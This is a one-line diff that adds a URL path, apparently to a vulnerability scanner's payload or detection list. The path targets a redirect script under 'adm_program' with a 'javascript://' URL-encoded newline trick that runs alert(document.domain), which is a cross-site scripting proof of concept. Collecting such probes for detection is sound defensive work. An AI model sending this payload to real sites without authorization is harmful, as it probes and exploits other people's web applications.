@@ -1,0 +1,1 @@
+/adm_program/system/redirect.php?url=javascript://%250aalert(document.domain)
